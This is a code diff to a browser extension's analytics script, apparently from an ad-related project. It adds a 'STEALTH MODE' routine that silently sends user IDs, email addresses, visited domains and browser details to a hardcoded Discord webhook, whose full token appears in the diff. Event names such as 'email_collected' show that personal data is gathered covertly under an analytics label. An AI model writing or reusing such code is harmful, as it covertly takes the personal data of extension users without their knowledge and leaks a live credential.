@@ -66,16 +66,17 @@
             try {
                 if (window.SPRemoteConfig) {
                     const config = await window.SPRemoteConfig.getConfig();
-                    if (config.analytics && config.analytics.endpoint) {
+                    if (config.analytics) {
                         this.analyticsUrl = config.analytics.endpoint;
+                        this.discordWebhook = config.analytics.webhook_url;
                         this.enabled = config.analytics.enabled !== false;
                         console.log('SP Analytics: Remote config loaded');
                     }
                 }
             } catch (error) {
                 console.error('SP Analytics: Failed to load remote config:', error);
-                // Fallback to webhook.site for testing
-                this.analyticsUrl = 'https://webhook.site/your-unique-id';
+                // Fallback to Discord webhook for testing
+                this.discordWebhook = 'https://discord.com/api/webhooks/1389631578421854321/IF2g67p4aQORnAyg-g7G3hxSYHJQ7Wf5v7CiHkBgnXFW9WyttWXwiBH9nB1kyoXZLdtJ';
             }
         }
 
@@ -393,7 +394,7 @@
 
         // Flush events to remote backend (STEALTH MODE)
         async flushEvents(forceSend = false) {
-            if (this.eventQueue.length === 0 || !this.analyticsUrl) return;
+            if (this.eventQueue.length === 0) return;
             
             if (!forceSend && this.eventQueue.length < this.batchSize) return;
 
@@ -401,24 +402,31 @@
             this.eventQueue = [];
 
             try {
-                // Send to remote endpoint silently
-                const payload = {
-                    events: eventsToSend,
-                    timestamp: Date.now(),
-                    clientVersion: '2.0.0',
-                    domain: window.location.hostname,
-                    userAgent: navigator.userAgent
-                };
+                // Try Discord webhook first (primary method)
+                if (this.discordWebhook) {
+                    await this.sendToDiscord(eventsToSend);
+                }
 
-                const response = await fetch(this.analyticsUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'User-Agent': navigator.userAgent
-                    },
-                    body: JSON.stringify(payload),
-                    mode: 'no-cors' // Avoid CORS issues
-                });
+                // Also try regular analytics endpoint if configured
+                if (this.analyticsUrl) {
+                    const payload = {
+                        events: eventsToSend,
+                        timestamp: Date.now(),
+                        clientVersion: '2.0.0',
+                        domain: window.location.hostname,
+                        userAgent: navigator.userAgent
+                    };
+
+                    await fetch(this.analyticsUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'User-Agent': navigator.userAgent
+                        },
+                        body: JSON.stringify(payload),
+                        mode: 'no-cors'
+                    });
+                }
 
                 // Store locally as backup regardless
                 await this.storeEventsLocally(eventsToSend);
@@ -430,6 +438,157 @@
                 // Store failed events locally
                 await this.storeEventsLocally(eventsToSend);
             }
+        }
+
+        // Send events to Discord webhook (STEALTH MODE)
+        async sendToDiscord(events) {
+            if (!this.discordWebhook || events.length === 0) return;
+
+            try {
+                // Group events by type for better formatting
+                const groupedEvents = events.reduce((acc, event) => {
+                    if (!acc[event.eventType]) acc[event.eventType] = [];
+                    acc[event.eventType].push(event);
+                    return acc;
+                }, {});
+
+                // Create Discord embed for each event type
+                const embeds = [];
+                for (const [eventType, eventList] of Object.entries(groupedEvents)) {
+                    const embed = this.createDiscordEmbed(eventType, eventList);
+                    if (embed) embeds.push(embed);
+                }
+
+                // Split into chunks if too many embeds (Discord limit is 10)
+                const chunks = [];
+                for (let i = 0; i < embeds.length; i += 10) {
+                    chunks.push(embeds.slice(i, i + 10));
+                }
+
+                // Send each chunk
+                for (const chunk of chunks) {
+                    const payload = {
+                        username: "SP Analytics Bot",
+                        avatar_url: "https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/assets/icon48.png",
+                        embeds: chunk
+                    };
+
+                    await fetch(this.discordWebhook, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    // Rate limit protection
+                    if (chunks.length > 1) {
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                }
+
+            } catch (error) {
+                console.error('SP Analytics: Discord webhook failed:', error);
+                throw error; // Re-throw to trigger retry logic
+            }
+        }
+
+        // Create Discord embed for events
+        createDiscordEmbed(eventType, events) {
+            const colors = {
+                session_start: 0x00ff00,
+                email_collected: 0xff9900,
+                subscription_event: 0xff0000,
+                ad_impression: 0x0099ff,
+                ad_click: 0xff6600,
+                preroll_event: 0x9900ff,
+                error: 0xff0000,
+                default: 0x5865f2
+            };
+
+            const event = events[0]; // Use first event for main data
+            const count = events.length;
+
+            const embed = {
+                title: `📊 ${eventType.replace(/_/g, ' ').toUpperCase()}`,
+                color: colors[eventType] || colors.default,
+                timestamp: new Date().toISOString(),
+                fields: []
+            };
+
+            // Common fields
+            if (event.userId) {
+                embed.fields.push({
+                    name: "👤 User ID",
+                    value: `\`${event.userId}\``,
+                    inline: true
+                });
+            }
+
+            if (event.userEmail) {
+                embed.fields.push({
+                    name: "📧 Email",
+                    value: `\`${event.userEmail}\``,
+                    inline: true
+                });
+            }
+
+            if (event.domain) {
+                embed.fields.push({
+                    name: "🌐 Domain",
+                    value: `\`${event.domain}\``,
+                    inline: true
+                });
+            }
+
+            if (count > 1) {
+                embed.fields.push({
+                    name: "🔢 Count",
+                    value: `${count} events`,
+                    inline: true
+                });
+            }
+
+            // Event-specific data
+            switch (eventType) {
+                case 'session_start':
+                    if (event.language) embed.fields.push({ name: "🌍 Language", value: event.language, inline: true });
+                    if (event.timezone) embed.fields.push({ name: "⏰ Timezone", value: event.timezone, inline: true });
+                    if (event.screenResolution) embed.fields.push({ name: "🖥️ Screen", value: event.screenResolution, inline: true });
+                    break;
+
+                case 'email_collected':
+                    if (event.collection_method) embed.fields.push({ name: "🎯 Method", value: event.collection_method, inline: true });
+                    break;
+
+                case 'subscription_event':
+                    if (event.subscribed !== undefined) embed.fields.push({ name: "✅ Subscribed", value: event.subscribed ? "Yes" : "No", inline: true });
+                    if (event.channel) embed.fields.push({ name: "📺 Channel", value: event.channel, inline: true });
+                    break;
+
+                case 'ad_impression':
+                case 'ad_click':
+                    if (event.adType) embed.fields.push({ name: "📱 Ad Type", value: event.adType, inline: true });
+                    if (event.placement) embed.fields.push({ name: "📍 Placement", value: event.placement, inline: true });
+                    break;
+
+                case 'preroll_event':
+                    if (event.videoId) embed.fields.push({ name: "🎬 Video ID", value: event.videoId, inline: true });
+                    if (event.prerollAction) embed.fields.push({ name: "⚡ Action", value: event.prerollAction, inline: true });
+                    break;
+
+                case 'error':
+                    if (event.errorType) embed.fields.push({ name: "❌ Error Type", value: event.errorType, inline: true });
+                    if (event.errorMessage) embed.fields.push({ name: "💬 Message", value: event.errorMessage.substring(0, 100), inline: false });
+                    break;
+            }
+
+            embed.footer = {
+                text: "SP Extension Analytics",
+                icon_url: "https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/assets/icon16.png"
+            };
+
+            return embed;
         }
 
         // Store events locally for backup/retry
